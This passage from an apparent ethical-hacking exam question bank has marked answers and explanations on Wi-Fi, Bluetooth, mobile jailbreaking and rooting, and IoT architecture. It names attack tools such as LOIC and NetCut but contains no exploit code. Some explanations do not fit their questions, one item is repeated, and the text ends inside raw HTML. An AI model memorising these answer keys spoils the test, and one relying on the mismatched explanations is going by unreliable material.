+ [x] Turn On auto-updates for all the wireless devices and patch the device firmware
+ [ ] Enable SSID broadcasts
+ [ ] Enable MAC address filtering on access points or routers
> **Explanation:**
> The Key Reinstallation Attack (KRACK) breaks the WPA2 protocol by forcing nonce reuse in encryption algorithms used by Wi-Fi. Following are some of the countermeasures to prevent KRACK attack:
> + Update all the routers and Wi-Fi devices with the latest security patches
> + Turn On auto-updates for all the wireless devices and patch the device firmware
> + Avoid using public Wi-Fi networks
> + Browse only secured websites and do not access the sensitive resource when your device is connected to an unprotected network
> + If you own IoT devices, audit the devices and do not connect to the insecure Wi-Fi routers
> + Always enable HTTPS Everywhere extension
> + Make sure to enable two-factor authentication

610. Which of the following device is used to analyze and monitor the RF spectrum?
+ [ ] Firewall
+ [ ] Router
+ [ ] Switch
+ [x] WIDS
> **Explanation:**
> The Wireless Intrusion Detection System (WIDS) analyzes and monitors the RF spectrum. Alarm generation helps in detecting unauthorized wireless devices that violate the security policies of the network.

611. In which of the following layers of wireless security does per frame/packet authentication provide protection against MITM attacks?
+ [ ] Data Protection
+ [ ] Wireless Signal Security
+ [x] Connection Security
+ [ ] Device Security
> **Explanation:**
> Connection Security: Per frame/packet authentication provides protection against MITM attacks. It does not allow the attacker to sniff data when two genuine users are communicating with each other, thereby securing the connection.

612. Which of the following countermeasures helps in defending against WPA/WPA2 cracking?
+ [ ] Avoid using public Wi-Fi networks
+ [ ] Make sure to enable two factor authentication
+ [x] Select a random passphrase that is not made up of dictionary words
+ [ ] Change the default SSID after WLAN configuration
> **Explanation:**
> + Defend Against WPA/WPA2 Cracking: Passphrases
> + The only way to crack WPA is to sniff the password PMK associated with the “handshake” authentication process, and if this password is extremely complicated, it will be almost impossible to crack.
> + Select a random passphrase that is not made up of dictionary words
> + Select a complex passphrase of a minimum of 20 characters in length and change it at regular intervals

613. Which of the following countermeasures helps in defending against Bluetooth hacking?
+ [ ] Place a firewall or packet filter between the AP and the corporate intranet.
+ [ ] Implement an additional technique for encrypting traffic, such as IPSEC over wireless.
+ [ ] Check the wireless devices for configuration or setup problems regularly.
+ [x] Use non-regular patterns as PIN keys while pairing a device. Use those key combinations that are non-sequential on the keypad.
> **Explanation:**
> SSID Settings Best Practices  
> + Use SSID cloaking to keep certain default wireless messages from broadcasting the ID to everyone.  
> + Do not use your SSID, company name, network name, or any easy to guess string in passphrases.  
> + Place a firewall or packet filter in between the AP and the corporate Intranet.  
> + Limit the strength of the wireless network so it cannot be detected outside the bounds of your organization.  
> + Check the wireless devices for configuration or setup problems regularly.  
> + Implement an additional technique for encrypting traffic, such as IPSEC over wireless.  
> 
> Some of the countermeasures to defend against Bluetooth hacking:  
> + Use non-regular patterns as PIN keys while pairing a device. Use those key combinations which are non-sequential on the keypad.  
> + Keep BT in the disabled state, enable it only when needed and disable immediately after the intended task is completed.  
> + Keep the device in non-discoverable (hidden) mode.  
> + DO NOT accept any unknown and unexpected request for pairing your device.  
> + Keep a check of all paired devices in the past from time to time and delete any paired device that you are not sure about.  
> + Always enable encryption when establishing BT connection to your PC.  
> + Set Bluetooth-enabled device network range to the lowest and perform pairing only in a secure area.  
> + Install antivirus that supports host-based security software on Bluetooth-enabled devices.  
> 
> If multiple wireless communications are being used, make sure that encryption is empowered on each link in the communication chain.

614. Which of the following techniques is used to detect rogue APs?
+ [ ] Passphrases
+ [ ] AES/CCMP encryption
+ [ ] Non-discoverable mode
+ [x] RF Scanning
> **Explanation:**
> + RF Scanning: Re-purposed APs that do only packet capturing and analysis (RF sensors) are plugged in all over the wired network to detect and warn the WLAN administrator about any wireless devices operating in the area.
> + Passphrases: It is used to defend against WPA/WPA2 cracking.
> + AES/CCMP encryption: It is used to defend against WPA/WPA2 cracking.
> + Non-discoverable mode: Setting the Bluetooth device to non-discoverable mode prevents that device from appearing on the list during a Bluetooth-enabled device search process. However, it is still visible to those users and devices who paired with the Bluetooth device previously or who know the MAC address of the Bluetooth device.

615. Which of the following techniques is used by network management software to detect rogue APs?
+ [ ] Virtual-private-network
+ [x] Wired side inputs
+ [ ] RF scanning
+ [ ] AP scanning
> **Explanation:**
> + **RF Scanning:** Re-purposed access points that do only packet capturing and analysis (RF sensors) are plugged in all over the wired network to detect and warn the WLAN administrator about any wireless devices operating in the area.  
> + **Wired Side Inputs:** Network management software uses this technique to detect rogue APs. This software detects devices connected in the LAN, including Telnet, SNMP, CDP (Cisco discovery protocol) using multiple protocols.  
> + **AP Scanning:** Access points that have the functionality of detecting neighboring APs operating in the nearby area will expose the data through its MIBS and web interface.  
> + **Virtual-Private-Network:** A Virtual Private Network (VPN) is a network that provides secure access to the private network through the internet. VPNs are used for connecting wide area networks (WAN). It allows computers on one network to connect to computers on another network.

616. Which of the following is to be used to keep certain default wireless messages from broadcasting the ID to everyone?
+ [x] SSID Cloaking
+ [ ] MAC Spoofing
+ [ ] Bluejacking
+ [ ] Bluesmacking
> **Explanation:**
> **SSID Cloaking:** It is a technique used to provide wireless security by hiding the SSID and network name from public broadcasting. Use SSID cloaking to keep certain default wireless messages from broadcasting the ID to everyone.
> 
> **Bluejacking:** Bluejacking is the use of Bluetooth to send messages to users without the recipient's consent, similar to email spamming.
> 
> **Bluesmacking:** A Bluesmacking attack occurs when an attacker sends an oversized ping packet to a victim's device, causing a buffer overflow.
> 
> **MAC Spoofing:** MAC Spoofing Attack is a passive attack in which attackers spoof the MAC address of the target Bluetooth-enabled device, in order to intercept or manipulate the data sent towards the target device.

# 17. Hacking Mobile Platforms
## Mobile Platform Attack Vectors
617. Which of the following is not an OWASP Top 10-2016 Mobile Risks?
+ [x] Buffer Overflow
+ [ ] Reverse Engineering
+ [ ] Insecure Communication
+ [ ] Insecure Cryptography
> **Explanation:**
> According to OWASP, following are the Top 10 Mobile Risks: 
> 1. Improper platform usage
> 2. Insecure data storage
> 3. Insecure communication
> 4. Insecure authentication
> 5. Insufficient cryptography
> 6. Insecure authorization
> 7. Client code quality
> 8. Code tampering
> 9. Reverse engineering
> 10. Extraneous functionality
> 
> Answer is “buffer overflow,” as it is not considered in the OWASP Top 10 List.

618. Which of the following technique helps protect mobile systems and users by limiting the resources the mobile application can access on the mobile platform?
+ [ ] Spam Filter
+ [ ] Firewall
+ [ ] Anti-Malware
+ [x] Sandbox
> **Explanation:**
> **Firewall:** A firewall is software- or hardware-based system located at the network gateway that protects the resources of a private network from unauthorized access of users on other networks.
> 
> **Sandbox:** App sandboxing is a security mechanism that helps protect systems and users by limiting resources the app can access to its intended functionality on the mobile platform. Often, sandboxing is useful in executing untested code or untrusted programs from unverified third parties, suppliers, untrusted users, and untrusted websites.
> 
> **Anti-Malware:** Anti-malware provides protection against malware, ransomware, and other growing threats to mobile devices.
> 
> **Spam Filter:** It filters and protects user emails against, viruses, malware, phishing emails, DoS attacks etc.

619. Which of the following attacks can be performed by Spam messages?
+ [x] Phishing Attacks
+ [ ] Bluesnarfing Attacks
+ [ ] Denial-of-Service Attacks
+ [ ] Wardriving Attacks
> **Explanation:**
> **Bluebugging Attacks:** Bluebugging involves gaining remote access to a target Bluetooth-enabled device and use its features without a victim’s knowledge or consent. Attackers compromise the target device’s security to create a backdoor attack prior to returning control of it to its owner. Bluebugging allows attackers to sniff sensitive corporate or personal data; receive calls and text messages intended for the victim; intercept phone calls and messages; forward calls and messages; connect to the Internet; and perform other malicious activities such as accessing contact lists, photos, and videos.
> 
> **Phishing Attacks:** Attackers perform phishing attack on mobile devices through spam messages or emails. Phishing emails or pop-ups redirect users to fake web pages of mimicking trustworthy sites that ask them to submit their personal information such as usernames, passwords, credit card details, address, and mobile number.
> **
> **Bluesnarfing Attacks:** Bluesnarfing is the theft of information from a wireless device through a Bluetooth connection, often between phones, desktops, laptops, PDAs, and others. This technique allows an attacker to access victim’s contact list, emails, text messages, photos, videos, business data, and so on stored on the device.
> **
> **Wardriving Attacks:** In a wardriving attack, wireless LANS are detected either by sending probe requests over a connection or by listening to web beacons. An attacker who discovers a penetration point can launch further attacks on the LAN.

620. Which of the following mobile Bluetooth attacks enables an attacker to gain remote access to the victims mobile and use its features without the victim’s knowledge or consent?
+ [ ] BlueSniff
+ [ ] Bluesnarfing
+ [ ] Bluesmacking
+ [x] Bluebugging
> **Explanation:**
> A Bluebugging attack involves gaining remote access to a target Bluetooth-enabled device and use its features without a victim’s knowledge or consent. Attackers compromise the target device’s security to create a backdoor attack prior to returning control of it to its owner. Bluebugging allows attackers to sniff sensitive corporate or personal data, receive calls and text messages intended for the victim, intercept phone calls and messages, forward calls, and messages, connect to the Internet and perform other malicious activities such as accessing contact lists, photos, and videos.

621. If an attacker is able to access the email contact list, text messages, photos, etc. on your mobile device, then what type of attack did the attacker employ?
+ [ ] Bluebugging
+ [ ] Bluesmacking
+ [x] Bluesnarfing
+ [ ] BlueSniff
> **Explanation:**
> Bluesnarfing is the theft of information from a wireless device through a Bluetooth connection, often between phones, desktops, laptops, PDAs, and others. This technique allows an attacker to access the victim’s contact list, emails, text messages, photos, videos, business data, and so on stored on the device.
> 
> Any device with its Bluetooth connection enabled and set to “discoverable” or “discovery” mode (allowing other Bluetooth devices within range to view the device) may be susceptible to bluesnarfing if the vendor’s software contains certain vulnerabilities. Bluesnarfing exploits others’ Bluetooth connections without their knowledge.

622. Which of the following is not a mobile platform risk?
+ [ ] Malicious Apps in App Store
+ [ ] Jailbreaking and Rooting
+ [x] Sandboxing
+ [ ] Mobile Malware
> **Explanation:**
> Sandboxing helps protect systems and users by limiting the resources an app can access to the mobile platform.

623. When Jason installed a malicious application on his mobile, the application modified the content in other applications on Jason’s mobile phone. What process did the malicious application perform?
+ [ ] Data Exfiltration
+ [ ] Data Mining
+ [x] Data Tampering
+ [ ] Data Loss
> **Explanation:**
> Data Tampering is a process of modifying content on the victim's mobile. Here, the malicious application has performed data tampering over other applications in Jason’s mobile phone.


## Threats and Attacks to Mobile Devices
624. Which of the following tools is used to root the Android OS?
+ [ ] LOIC
+ [ ] zANTI
+ [x] TunesGo
+ [ ] DroidSheep
> **Explanation:**
> zANTI is an android application which allows you to perform various attacks. Low Orbit Ion Cannon (LOIC) is a mobile application that allows the attackers to perform DoS/DDoS attacks on the target IP address, and DroidSheep is a simple Android tool for web session hijacking (sidejacking). TunesGo is an android tool that has an advanced android root module that recognize and analyzes your Android device and choose an appropriate Android-root-plan for it automatically.

625. Which of the following browser applications encrypts your Internet traffic and then hides it by bouncing through a series of computers around the world?
+ [x] ORBOT
+ [ ] UC Browser
+ [ ] Google Chrome
+ [ ] Mozilla FireFox
> **Explanation:**
> Orbot is a proxy app that empowers other apps to use the internet more privately. It uses Tor to encrypt your Internet traffic and then hides it by bouncing through a series of computers around the world. Attackers can use this application to hide their identity while performing attacks or surfing through the target web applications.

626. Which of the following applications allows attackers to identify the target devices and block the access of Wi-Fi to the victim devices in a network?
+ [ ] Network Spoofer
+ [ ] KingoRoot
+ [ ] DroidSheep
+ [x] NetCut
> **Explanation:**
> NetCut is an is a Wi-Fi killing mobile application that quickly detects all network users in the WIFI and allows the attacker to kill Wi-Fi access to any specific user in a network. Attackers use this tool to identify target devices and block the access of Wi-Fi to the victim devices in a network.

627. Which of the following android applications allows you to find, lock or erase a lost or stolen device?
+ [x] Find My Device
+ [ ] Faceniff
+ [ ] Find My iPhone
+ [ ] X-Ray
> **Explanation:**
> Find My Device is an in-built android mobile security application that helps you to locate a lost Android device easily, and keeps your information safe.

628. Which of the following iOS applications allows you to find, lock or erase a lost or stolen device?
+ [ ] Faceniff
+ [ ] X-Ray
+ [x] Find My iPhone
+ [ ] Find My Device
> **Explanation:**
> Find My iPhone is an iOS mobile security application that helps you easily to locate a lost iphone device, and keeps your information safe.

629. Which of the following Jailbreaking techniques will make the mobile device jailbroken after each reboot?
+ [ ] Semi-Tethered Jailbreaking
+ [ ] None of the Above
+ [x] Untethered Jailbreaking
+ [ ] Tethered Jailbreaking
> **Explanation:**
> An untethered jailbreak has the property that if the user turns the device off and back on, the device will start up completely, and the kernel will be patched without the help of a computer – in other words, it will be jailbroken after each reboot.

630. Which of the following tools is not used for iOS Jailbreaking?
+ [x] Unrevoked
+ [ ] Velonzy
+ [ ] Yalu
+ [ ] TaiG
> **Explanation:**
> Among the given options, Yalu, Velonzy and TaiG are iOS Jailbreaking tools, whereas Unrevoked is an Android rooting tool.

631. Which of the following types of jailbreaking allows user-level access but does not allow iboot-level access?
+ [x] Userland Exploit
+ [ ] Bootrom Exploit
+ [ ] iBoot Exploit
+ [ ] None of the above
> **Explanation:**
> Userland Exploit uses a loophole in the system application. It allows user-level access but does not allow iboot-level access. You cannot secure iOS devices against this exploit, as nothing can cause a recovery mode loop. Only firmware updates can patch these types of vulnerabilities. iBoot Exploit and Bootrom Exploit allow user-level access and also iboot-level access.

632. Which of the following processes is supposed to install a modified set of kernel patches that allows users to run third-party applications not signed by the OS vendor?
+ [ ] WarDriving
+ [ ] Sandboxing
+ [x] JailBreaking
+ [ ] Spear-Phishing
> **Explanation:**
> Jailbreaking is defined as the process of installing a modified set of kernel patches that allows users to run third-party applications not signed by the OS vendor. It is the process of bypassing user limitations set by Apple, such as modifying the OS, attaining admin privileges, and installing unofficially approved apps via “side loading.” You can accomplish jailbreaking simply by modifying iOS system kernels. A reason for jailbreaking iOS devices such as iPhone, iPad, and iPod Touch is to expand the feature set restricted by Apple and its App Store. Jailbreaking provides root access to the OS and permits downloading of third-party applications, themes, and extensions that are unavailable through the official Apple App Store. Jailbreaking also removes sandbox restrictions, which enables malicious apps to access restricted mobile resources and information.

633. Which of the following statements is not true for securing iOS devices?
+ [ ] Do not jailbreak or root your device if used within enterprise environments
+ [ ] Do not store sensitive data on client-side database
+ [x] Disable Jailbreak detection
+ [ ] Disable Javascript and add-ons from web browser
> **Explanation:**
> Jailbreak detection has to be enabled all the time in any iOS device. Disabling Jailbreaking detection in the device cannot secure the device from jailbreaking and once if jailbreaking has been performed on the device, the device can be prone to installation of applications from any untrusted sources and can also lead to various attacks that can cause data theft.

634. Which of the following applications is used for Jailbreaking iOS?
+ [ ] KingoRoot
+ [x] Pangu Anzhuang
+ [ ] Superboot
+ [ ] One Click Root
> **Explanation:**
> Among the given options, KingoRoot, One Click Root and Superboot are Android rooting tools whereas Pangu Anzuhang is the tool that is used to perform jailbreaking for iOS mobile devices.

635. Which of the following mobile applications is used to perform Denial-of-Service Attacks?
+ [ ] MTK Droid
+ [x] Low Orbit Ion Cannon (LOIC)
+ [ ] Unrevoked
+ [ ] DroidSheep
> **Explanation:**
> **Low Orbit Ion Cannon (LOIC):** LOIC is a mobile application that allows the attackers to perform DoS/DDoS attacks on the target IP address. This application can perform UPD, HTTP, or TCP flood attacks.
> 
> **DroidSheep:** DroidSheep is a simple Android tool for web session hijacking (“sidejacking”), using libpcap and arpspoof.
> 
> **Unrevoked:** Unrevoked is an Android rooting tool.
> 
> **MTK Droid:** MTK Droid is an Android rooting tool.

636. By performing which of the following Jailbreaking techniques does a mobile device start up completely, and it will no longer have a patched kernel after a user turns the device off and back on?
+ [ ] Tethered Jailbreaking
+ [x] Semi-Tethered Jailbreaking
+ [ ] Untethered Jailbreaking
+ [ ] None of the Above
> **Explanation:**
> A semi-tethered jailbreaking has the property that if the user turns the device off and back on, the device will start up completely; it will no longer have a patched kernel, but it will still be usable for normal functions. To use jailbroken addons, the user needs to start the device with the help of the jailbreaking tool.

637. Which of the following is an Android Vulnerability Scanning Tool?
+ [ ] Velonzy
+ [x] X-Ray
+ [ ] TaiG
+ [ ] Yalu
> **Explanation:**
> Among the given options, Yalu, Velonzy and TaiG are iOS Jailbreaking tools, whereas X-Ray is an android Vulnerability Scanner.

638. Which of the following processes allows Android users to attain privileged control within Android’s subsystem?
+ [ ] Warchalking
+ [ ] Jailbreaking
+ [x] Rooting
+ [ ] Wardriving
> **Explanation:**
> **Data Caching:** An OS cache stores used data/information in memory on temporary basis in the hard disk. An attacker can dump this memory by rebooting the victim’s computer to a malicious OS and can extract sensitive data from the dumped memory.
> 
> **Wardriving:** In a wardriving attack, wireless LANS are detected either by sending probe requests over a connection or by listening to web beacons. An attacker who discovers a penetration point can launch further attacks on the LAN.
> 
> **Rooting:** Rooting allows Android users to attain privileged control (known as “root access”) within Android’s subsystem. Rooting can result in the exposure of sensitive data stored in the mobile device.
> 
> **WarChalking:** A method used to draw symbols in public places to advertise open WiFi networks.


## Mobile Security Guidelines and Security Tools
639. Which of the following is not a feature of Mobile Device Management Software?
+ [x] Sharing confidential data among devices and networks
+ [ ] Remotely wipe data in the lost or stolen device
+ [ ] Perform real time monitoring and reporting
+ [ ] Enforce policies and track inventory
> **Explanation:**
> Mobile Device Management provides platforms for over-the-air or wired distribution of applications, data and configuration settings for all types of mobile devices, including mobile phones, smartphones, tablet computers, and so on. It enforces policies and tracks inventory, remotely wipe data in the lost or stolen device, and performs real time monitoring and reporting. MDM does not share confidential data among devices and networks.

640. Which of the following is a Mobile Device Management Software?
+ [ ] Phonty
+ [ ] GadgetTrak
+ [x] XenMobile
+ [ ] SpyBubble
> **Explanation:**
> Among the options, XenMobile is the only tool that can provide complete Mobile Device Management. The remaining tools mentioned in the options are used only for tracking the geographical location of mobile devices.

641. If you are responsible for securing a network from any type of attack and if you have found that one of your employees is able to access any website that may lead to clickjacking, attacks, what would you do to avoid the attacks?
+ [ ] Delete Cookies
+ [ ] Enable Remote Management
+ [ ] Configure Application certification rules
+ [x] Harden browser permission rules
> **Explanation:**
> As you have observed that the employee is able to access any website that may lead to potential attacks, you have to harden the browser permission rules according to the company’s security policies in order to avoid attacks from taking place.

642. In order to avoid data loss from a Mobile device, which of following Mobile Device Management security measures should you consider?
+ [x] Perform periodic backup and synchronization
+ [ ] Enable Remote Management
+ [ ] Encrypt Storage
+ [ ] Configure Application certification rules
> **Explanation:**
> In order to secure your data from any kind of data loss, the first thing you have to do is to take periodic backups of the data. You can use a secure, over-the-air backup-and-restore tool that performs periodic background synchronization.

643. Which of the following is not a countermeasure for phishing attacks?
+ [x] Disable the “block texts from the internet” feature from your provider
+ [ ] Review the bank’s policy on sending SMS
+ [ ] Never reply to a SMS that urges you to act or respond quickly
+ [ ] Do not click on any links included in the SMS
> **Explanation:**
> By disabling the “block texts from the internet” feature from your provider you may receive spam text messages from the internet which may lead to phishing attacks.

644. Which of the following refers to a policy allowing an employee to bring his or her personal devices such as laptops, smartphones, and tablets to the workplace and using them for accessing the organization’s resources as per their access privileges?
+ [ ] Spear-Phishing
+ [ ] Phishing
+ [ ] Social Engineering
+ [x] BYOD
> **Explanation:**
> Bring your own device (BYOD) refers to a policy allowing an employee to bring his or her personal devices such as laptops, smartphones, and tablets to the workplace and using them for accessing the organization’s resources as per their access privileges. BYOD policy allows employees to use the devices that they are comfortable with and best fits their preferences and work purposes. Social Engineering, Phishing and Spear-phishing are some of the types of attacks.

645. Which of the following can pose a risk to mobile platform security?
+ [ ] Install applications from trusted application stores
+ [ ] Securely wipe or delete the data when disposing of the device
+ [x] Connecting two separate networks such as Wi-Fi and Bluetooth simultaneously
+ [ ] Disable wireless access such as Wi-Fi and Bluetooth, if not in use
> **Explanation:**
> Given below are some of the guidelines that help one to protect their mobile device:
> + Do not load too many applications and avoid auto-upload of photos to social networks
> + Perform a Security Assessment of the Application Architecture
> + Maintain configuration control and management
> + Install applications from trusted application stores
> + Securely wipe or delete the data disposing of the device
> + Do not share the information within GPS-enabled apps unless they are necessary
> + Never connect two separate networks such as Wi-Fi and Bluetooth simultaneously
> + Disable wireless access such as Wi-Fi and Bluetooth, if not in use
> 
> In order to provide security to the mobile device platform, never connect two separate networks such as Wi-Fi and Bluetooth simultaneously.

# 18. IoT Hacking
## Understanding IoT Concepts
646. Which of the following IoT technology components bridges the gap between the IoT device and the end user?
+ [ ] Remote control using mobile app
+ [ ] Sensing technology
+ [ ] Cloud server/data storage
+ [x] IoT gateway
> **Explanation:**
> **Sensing Technology:** Sensors embedded in the devices sense a wide variety of information from their surroundings like temperature, gases, location, working of some industrial machine as well as sensing health data of a patient.
> 
> **IoT Gateways:** Gateways are used to bridge the gap between the IoT device (internal network) and the end user (external network) and thus allowing them to connect and communicate with each other. The data collected by the sensors in IoT devices send the collected data to the concerned user or cloud through the gateway.
> 
> **Cloud Server/Data Storage:** The collected data after travelling through the gateway arrives at the cloud, where it is stored and undergoes data analysis. The processed data is then transmitted to the user where he/she takes certain action based on the information received by him/her.
> 
> **Remote Control using Mobile App:** The end user uses remote controls such as mobile phones, tabs, laptops, etc. installed with a mobile app to monitor, control, retrieve data, and take a specific action on IoT devices from a remote location.

647. Which of the following IoT technology components collects data that undergoes data analysis, from the gateway?
+ [ ] IoT gateway
+ [ ] Sensing technology
+ [x] Cloud server/data storage
+ [ ] Remote control using mobile app
> **Explanation:**
> **Sensing Technology:** Sensors embedded in the devices sense a wide variety of information from their surroundings like temperature, gases, location, working of some industrial machine as well as sensing health data of a patient.
> 
> **IoT Gateways:** Gateways are used to bridge the gap between the IoT device (internal network) and the end user (external network) and thus allowing them to connect and communicate with each other. The data collected by the sensors in IoT devices send the collected data to the concerned user or cloud through the gateway.
> 
> **Cloud Server/Data Storage:** The collected data after travelling through the gateway arrives at the cloud, where it is stored and undergoes data analysis. The processed data is then transmitted to the user where he/she takes certain action based on the information received by him/her.
> 
> **Remote Control using Mobile App:** The end user uses remote controls such as mobile phones, tabs, laptops, etc. installed with a mobile app to monitor, control, retrieve data, and take a specific action on IoT devices from a remote location.

648. Which of the following IoT architecture layers consists of all the hardware parts like sensors, RFID tags, readers or other soft sensors, and the device itself?
+ [ ] Application layer
+ [ ] Middleware layer
+ [ ] Internet layer
+ [x] Edge technology layer
+ [ ] Access gateway layer
> **Explanation:**
> **IoT Architecture**
> The functions performed by each layer in the architecture are given below:
> + **Edge Technology Layer**  
> 	This layer consists of all the hardware parts like sensors, RFID tags, readers or other soft sensors and the device itself. These entities are the primary part of the data sensors that are deployed in the field for monitoring or sensing various phenomena. This layer plays an important part in data collection, connecting devices within the network and with the server.
> + **Access Gateway Layer**  
>     This layer helps to bridge the gap between two endpoints like a device and a client. The very first data handling also takes place in this layer. It carries out message routing, message identification and subscribing.
> + **Internet Layer**  
>     This is the crucial layer as it serves as the main component in carrying out the communication between two endpoints such as device-to-device, device-to-cloud, device-to-gateway and back-end data-sharing.
> + **Middleware Layer**  
>     This is one of the most critical layers that operates in two-way mode. As the name suggests this layer sits in the middle of the application layer and the hardware layer, thus behaving as an interface between these two layers. It is responsible for important functions such as data management, device management and various issues like data analysis, data aggregation, data filtering, device information discovery and access control.
> + **Application Layer**  
>     This layer placed at the top of the stack, is responsible for the delivery of services to the respective users from different sectors like building, industrial, manufacturing, automobile, security, healthcare, etc.

649. Which of the following IoT architecture layers carries out communication between two end points such as device-to-device, device-to-cloud, device-to-gateway, and back-end data-sharing?
+ [ ] Middleware layer
+ [x] Internet layer
+ [ ] Access gateway layer
+ [ ] Application layer
+ [ ] Edge technology layer
> **Explanation:**
> **IoT Architecture**
> The functions performed by each layer in the architecture are given below:  
> + **Edge Technology Layer**
> This layer consists of all the hardware parts like sensors, RFID tags, readers or other soft sensors and the device itself. These entities are the primary part of the data sensors that are deployed in the field for monitoring or sensing various phenomena. This layer plays an important part in data collection, connecting devices within the network and with the server.  
> + **Access Gateway Layer**
> This layer helps to bridge the gap between two endpoints like a device and a client. The very first data handling also takes place in this layer. It carries out message routing, message identification and subscribing.  
> + **Internet Layer**
> This is the crucial layer as it serves as the main component in carrying out the communication between two endpoints such as device-to-device, device-to-cloud, device-to-gateway and back-end data-sharing.  
> + **Middleware Layer**
> This is one of the most critical layers that operates in two-way mode. As the name suggests this layer sits in the middle of the application layer and the hardware layer, thus behaving as an interface between these two layers. It is responsible for important functions such as data management, device management and various issues like data analysis, data aggregation, data filtering, device information discovery and access control.  
> + **Application Layer**
> This layer placed at the top of the stack, is responsible for the delivery of services to the respective users from different sectors like building, industrial, manufacturing, automobile, security, healthcare, etc.

650. Which of the following IoT devices is included in the buildings service sector?
+ [ ] MRI, PDAs, implants, surgical equipment, pumps, monitors, telemedicine, etc.
+ [ ] Turbines, windmills, UPS, batteries, generators, meters, drills, fuel cells, etc.
+ [x] HVAC, transport, fire and safety, lighting, security, access, etc.
+ [ ] Digital cameras, power systems, MID, e-readers, dishwashers, desktop computers, etc.
> **Explanation:**
> |Service Sectors|Application Groups|Locations|Devices|
> |:----|:----|:----|:----|
> |Buildings|Commercial/Institutional|Office, Education, Retail, Hospitality, Healthcare, Airports, Stadiums|HVAC, Transport, Fire & Safety, Lighting, Security, Access, etc.|
> | |Industrial|Process, Clean Room, Campus| |
> |Energy|Supply/Demand|Power Gen, Trans & Dist, Low Voltage, Power Quality, Energy management|Turbines, Windmills, UPS, Batteries, Generators, Meters, Drills, Fuel Cells, etc.|
> | |Alternative|Solar Wind, Co-generation, Electrochemical| |
> | |Oil/Gas|Rigs, Derricks, Heads, Pumps, Pipelines| |
> |Consumer and Home|Infrastructure|Wiring, Network Access, Energy management|Digital cameras, Power Systems, MID, e-Readers, Dishwashers, Desktop Computers, Washer/ Dryers, Meters, Lights, TVs, MP3, Games Console, Alarms, etc.|
> | |Awareness & Safety|Security/Alerts, Fire Safety, Elderly, Children, Power Protection| |
> | |Convenience & Entertainment|HVAC/Climate, Lighting, Appliance, Entertainment| |
> |Healthcare And Life Science|Care|Hospital, ER, Mobile, POC, Clinic, Labs, Doctor Office|MRI, PDAs, Implants, Surgical Equipment, Pumps, Monitors, Telemedicine, etc.|
> | |In Vivo/Home|Implants, Home, Monitoring Systems| |
> | |Research|Drug Discovery, Diagnostics, Labs| |
> |Transportation|Non-Vehicular|Air, Rail, Marine|Vehicles, Lights, Ships, Planes, Signage, Tolls, etc.|
> | |Vehicles|Consumer, Commercial, Construction, Off-Highway| |
> | |Trans Systems|Tolls, Traffic mgmt., Navigation| |

651. Which of the following protocols is a type of short-range wireless communication?
+ [ ] Very Small Aperture Terminal (VSAT)
+ [ ] LTE-Advanced
+ [ ] Power-line Communication (PLC)
+ [x] ZigBee
> **Explanation:**
> + LTE-Advanced is a type of Medium-range Wireless Communication.
> + Very Small Aperture Terminal (VSAT) is a type of long-range Wireless Communication.
> + Power-line Communication (PLC)is a type of Wires Communication.

652. Which of the following protocol uses magnetic field induction to enable communication between two electronic devices?
+ [x] Near Field Communication (NFC)
+ [ ] LTE-Advanced
+ [ ] Multimedia over Coax Alliance (MoCA)
+ [ ] Ha-Low
> **Explanation:**
> **LTE- Advanced:** LTE-Advanced is a standard for mobile communication that provides enhancement to LTE thus focusing on providing higher capacity in terms of data rate, extended range, efficiency and performance.
> 
> **Multimedia over Coax Alliance (MoCA):** MoCA is a type of network protocol that provides a high definition video of home and content related to it over existing coaxial cable.
> 
> **HaLow:** It is another variant of Wi-Fi standard that provides extended range, making it useful for communications in rural areas. It offers low data rates, thus reducing power and cost for transmission.

653. Name the communication model, where the IoT devices use protocols such as ZigBee, Z-Wave or Bluetooth, to interact with each other?
+ [ ] Back-End Data-Sharing Communication Model
+ [ ] Device-to-Cloud Communication Model
+ [ ] Device-to-Gateway Communication Model
+ [x] Device-to-Device Communication Model
> **Explanation:**
> The protocols used in various communication models are listed below:  
> + Device-to-Cloud Communication Model: Wi-Fi, Ethernet, cellular.  
> + Device-to-Gateway Communication Model: ZigBee and Z-Wave.  
> + Back-End Data-Sharing Communication Model: CoAP or HTTP.

654. Name the communication model where the IoT devices communicate with the cloud service through gateways?
+ [x] Device-to-gateway communication model
+ [ ] Device-to-device communication model
+ [ ] Device-to-cloud communication model
+ [ ] Back-end data-sharing communication model
> **Explanation:**
> **Device-to-Device Communication Model:** In this type of communication, devices that are connected interact with each other through the internet but mostly they use protocols like ZigBee, Z-Wave or Bluetooth.  
> 
> **Device-to-Cloud Communication Model:** In this type of communication, devices communicate with the cloud directly rather than directly communicating with the client in order to send or receive the data or commands.  
> 
> **Device-to-Gateway Communication Model:** In the Device-to-Gateway communication, Internet of Things device communicates with an intermediate device called a Gateway, which in turn communicates with the cloud service.  
> 
> **Back-End Data-Sharing Communication Model:** This type of communication model extends the device-to-cloud communication type in which the data from the IoT devices can be accessed by authorized third parties. Here devices upload their data onto the cloud which is later accessed or analyzed by the third parties.

655. Which of the following short range wireless communication protocol is used for home automation that allows devices to communicate with each other on local wireless LAN?
+ [ ] Cellular
+ [ ] VSAT
+ [x] Thread
+ [ ] MoCA
> **Explanation:**
> **Thread** is an IPv6 based networking protocol for IoT devices. Its main aim is home automation, so that the devices can communicate with each other on local wireless networks.
> 
> **VSAT and Cellular:** These are long range wireless communication protocol.
> 
> **MoCA:** It is a wired communication protocol.

651. Which of the following IoT devices is included in the buildings service sector?
+ [ ] MRI, PDAs, implants, surgical equipment, pumps, monitors, telemedicine, etc.
+ [ ] Turbines, windmills, UPS, batteries, generators, meters, drills, fuel cells, etc.
+ [x] HVAC, transport, fire and safety, lighting, security, access, etc.
+ [ ] Digital cameras, power systems, MID, e-readers, dishwashers, desktop computers, etc.

> **Explanation:**
> <table style="border: none;" width="606" cellspacing="0"
> cellpadding="0" border="1">
>     <tbody>
>         <tr style="height: 41pt;">
>             <td style="height: 41pt; width: 90.75pt; padding: 5pt; border: 1pt solid black; text-align: left;" valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Service Sectors</span></strong></p>
>             </td>
>             <td style="height: 41pt; width: 86.25pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
>             <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Application Groups</span></strong></p>
>             </td>
>             <td style="height: 41pt; width: 163.5pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black;
> border-bottom: 1pt solid black; border-left: none; text-align: left;"
> valign="top">
